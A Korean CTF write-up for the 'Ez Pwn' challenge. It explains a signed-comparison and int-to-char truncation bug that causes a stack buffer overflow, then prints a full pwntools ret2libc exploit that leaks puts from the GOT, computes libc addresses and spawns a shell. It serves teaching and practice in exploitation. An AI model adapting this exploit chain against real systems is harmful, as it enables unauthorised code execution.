# 문제명
-Ez Pwn

## 문제 설명

> 정수 길이를 입력받아 그 길이만큼 버퍼에 값을 입력받는 간단한 pwn 문제. 바이너리 안에 ROP 가젯(pop rdi; ret 등)이 친절하게 심어져 있다.

- nc 15.235.202.47 8999


## 풀이

### 분석

checksec으로 확인해보니 스택 카나리가 없고 PIE도 꺼져 있었다. 즉 오버플로우 지점만 찾으면 바로 리턴 주소를 덮어써서 실행 흐름을 통제할 수 있는 조건이었다. main 함수를 뜯어보니 scanf로 정수를 하나 입력받은 뒤 그 값이 0x50 이하인지 검사하는데 이 비교가 부호 있는 비교(jle)로 되어 있어서 음수를 넣으면 무조건 통과해버리는 문제가 있었다. 게다가 그 정수 값을 다시 1바이트 크기로 잘라서 read 함수의 세 번째 인자, 즉 읽어들일 바이트 수로 그대로 사용하고 있었다.

### 취약점

실제 버퍼 크기는 160바이트밖에 안 되는데도 음수를 교묘하게 골라 넣으면 read가 최대 255바이트까지 받아버리게 만들 수 있었다. 예를 들어 -56을 넣으면 부호 있는 비교로는 통과하면서 1바이트로 잘리는 순간 200이라는 값이 되어 read 크기가 200바이트가 되는 식이다. 버퍼 160바이트에 저장된 rbp 8바이트를 더한 168바이트를 채우고 나면 그다음부터는 리턴 주소를 완전히 마음대로 덮어쓸 수 있는 구간이었다. 이너리 안에는 system이나 "/bin/sh" 같은 문자열이나 함수는 전혀 없었지만 대신 gadget이라는 이름의 함수 안에 pop rdi, pop rsi, pop rdx 같은 ROP 가젯들이 심어져 있어서 이걸 이용해 풀라는 의도가 분명했다.

### 익스플로잇 

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

e = ELF('./chall')

POP_RDI = 0x40117a
RET     = POP_RDI + 1
PUTS_PLT = e.plt['puts']
GOT_PUTS = e.got['puts']
MAIN     = e.symbols['main']
PADDING  = 168

LIBC_PUTS_OFF   = 0x80e50
LIBC_SYSTEM_OFF = 0x50d70
LIBC_BINSH_OFF  = 0x1d8678

host, port = sys.argv[1], int(sys.argv[2])
p = remote(host, port)

def send_len(req):
    p.recvuntil(b'buffer: ')
    p.sendline(str(req).encode())
    p.recvuntil(b'> ')

leak_payload  = b'\x00' * PADDING
leak_payload += p64(POP_RDI) + p64(GOT_PUTS) + p64(PUTS_PLT)
leak_payload += p64(MAIN)
size1 = len(leak_payload)
req1 = size1 if size1 <= 0x50 else size1 - 256

send_len(req1)
p.send(leak_payload)

p.recvuntil(b'attempt is 0\n')
leak_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak_puts - LIBC_PUTS_OFF
log.success(f'leak puts@libc = {hex(leak_puts)}')
log.success(f'libc base      = {hex(libc_base)}')

system_addr = libc_base + LIBC_SYSTEM_OFF
binsh_addr  = libc_base + LIBC_BINSH_OFF

payload2  = b'\x00' * PADDING
payload2 += p64(RET)
payload2 += p64(POP_RDI) + p64(binsh_addr)
payload2 += p64(system_addr)
size2 = len(payload2)
req2 = size2 if size2 <= 0x50 else size2 - 256

send_len(req2)
p.send(payload2)

log.success('쉘 획득 시도, interactive 전환')
p.interactive()
```

## 배운 점

정리하면 이 문제의 핵심은 부호 있는 정수 비교로 인한 크기 제한 우회와 int에서 char로 축소 변환되면서 발생하는 오버플로우 두 가지가 겹쳐진 전형적인 스택 버퍼 오버플로우였고 바이너리 안에 system이 없더라도 GOT leak과 libc 데이터베이스 조회만으로 충분히 ret2libc 공격이 가능하다는 것을 보여주는 문제였다.
